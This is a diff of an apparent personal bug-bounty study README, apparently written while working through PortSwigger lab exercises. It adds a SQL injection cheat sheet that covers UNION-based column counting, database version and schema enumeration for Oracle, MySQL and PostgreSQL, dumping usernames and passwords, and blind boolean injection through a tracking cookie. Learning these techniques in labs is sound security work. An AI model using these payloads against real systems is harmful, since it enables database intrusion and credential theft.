@@ -1,15 +1,46 @@
-```'+or+1=1--```
+# Bug-Bounty
+This is all about web &amp; bugbounty
+<h1>SQLI</h1>
 
-```'adminstrator--```
+```
+(1) Determine the number of columns =>
 
-1. First of all in sqli the very basic is we have to find a input where we can performe the sql command .
-such as here is a example :
+  i)  ' order by 3 -- 
+   ii) 'order by 3# 
 
-```https://0aae009d03fc169e8a3efa9100a90037.web-security-academy.net/filter?category=Lifestyle```
+(2) Determine the data types of the columns =>  
+   i) ' UNION SELECT 'a', 'a' from DUAL-- -> here is a built-in table on Oracle called dual which can be used for this purpose
+   ii) ' UNION SELECT 'a', 'a'#
 
-here we got category where we give them a type like Lifestyle etc etc and they give back us the product but how can we see all the products which has not even permits to show us    so we can do 
 
-```https://0aae009d03fc169e8a3efa9100a90037.web-security-academy.net/filter?category='+or+1=1--```
+(3) Output the version of the database => 
+  i) ' UNION SELECT banner, NULL from v$version-- (Oracle) --> The banner displays the database release and version number AND The version information is stored in a table called v$version.
+  ii) ' UNION SELECT @@version, NULL# (Microsoft ,MySql)
+  iii)' UNION SELECT version(), NULL-- (postgresql)
+  
+(4) Output the list of table names in the database
 
-2. Now perform a SQL injection attack that logs in to the application as the administrator user.
-In the login form i just gave the user name administrator and using '-- comments out the rest
+   i) ' UNION SELECT table_name, NULL FROM information_schema.tables--  (postgresql)
+   ii) ' UNION SELECT table_name NULL FROM all_tables-- (oracle)
+ 
+(5) Output the column names of the table 
+
+    i) ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xacgsm'-- (postgresql)
+    ii) ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name= 'USERS_ABCDEF'-- (oracle)
+    
+(6) Output the usernames and passwords
+
+    i) ' UNION select username_pxqwui, password_bfvoxs from users_xacgsm--
+    ii) ' UNION SELECT NULL,username||'~'||password FROM users--(for retrieving multiple values in a single column)
+
+
+
+7)Blind SQl->
+
+   i)Modify the TrackingId cookie, changing it to:
+     TrackingId=xyz' AND '1'='1
+   ii)TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+   iii)'and (select 'a' from users where username ='administrator')='a'--
+   iV)'and (select username from users where username ='administrator' AND LENGTH(password)>1)='administrator'--
+   v)' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='q'--
+
